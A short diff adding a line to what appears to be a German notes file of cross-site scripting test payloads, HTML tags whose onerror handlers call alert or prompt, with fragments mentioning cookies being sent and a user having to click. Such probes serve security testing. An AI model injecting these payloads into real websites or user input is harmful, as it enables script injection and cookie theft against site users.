@@ -1,6 +1,7 @@
 <audio src=1 href=1 onerror="javascript:alert(1)"></audio>
 <video src=1 href=1 onerror="javascript:alert(1)"></video>
 <img/src/onerror=prompt(8)>
+<img src="invalid-image.jpg" onerror="alert('XSS möglich')">
 
 Hier wird der Cookie mit gesendet:
 User muss erstmal Klicken:
